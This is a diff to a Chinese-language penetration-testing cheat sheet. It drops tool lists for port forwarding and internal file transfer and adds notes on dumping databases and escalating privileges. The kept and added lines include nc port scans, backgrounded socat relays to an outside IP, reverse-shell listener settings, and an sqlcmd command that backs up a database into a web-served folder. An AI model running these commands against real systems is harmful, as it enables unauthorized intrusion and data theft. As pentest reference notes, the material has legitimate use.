@@ -3,21 +3,6 @@
 
 端口转发
 ----------------------------------------
-- windows
-    - lcx
-    - netsh
-- linux
-    - portmap
-    - iptables
-- socket代理
-    - Win: xsocks
-    - Linux: proxychains
-- 基于http的转发与socket代理(低权限下的渗透)
-    - 端口转发: tunna
-    - socks代理: reGeorg
-- ssh通道
-    - 端口转发
-    - socks
 - nc
     - 端口扫描
 	``nc -z -v -n 172.31.100.7 21-25``
@@ -50,22 +35,11 @@
 	``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
 	``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
 
-内网文件传输
+脱裤
 ----------------------------------------
-- windows下文件传输
-    - powershell
-    - vbs脚本文件
-    - bitsadmin
-    - 文件共享
-    - 使用telnet接收数据
-    - hta
-- linux下文件传输
-    - python
-    - wget
-    - tar + ssh
-    - 利用dns传输数据
-- 文件编译
-    - powershell将exe转为txt，再txt转为exe
+- sqlcmd
+	+ dump数据:``sqlcmd -S 127.0.0.1,1433 -U username123 -P pasword123 -d datebase123 -Q"BACKUP DATABASE database123 to disk='c:\www\myweb\wap\userlz.bak'"``
+- sqlmap
 
 远程连接 && 执行程序
 ----------------------------------------
@@ -122,6 +96,12 @@ netstat
 		设置反弹回来的IP 本机
 	- SET LPORT
 		设置接收反弹的端口
+		
+提权
+-----------------------------------------
+- PEASS-ng
+	 + 新一代特权升级脚本套件，适用于 Windows 和 Linux/Unix* 以及 MacOS 的权限提升工具
+	 + 项目地址: ``https://github.com/carlospolop/PEASS-ng``
 
 
 .. |netstat| image:: ../images/netstat.png
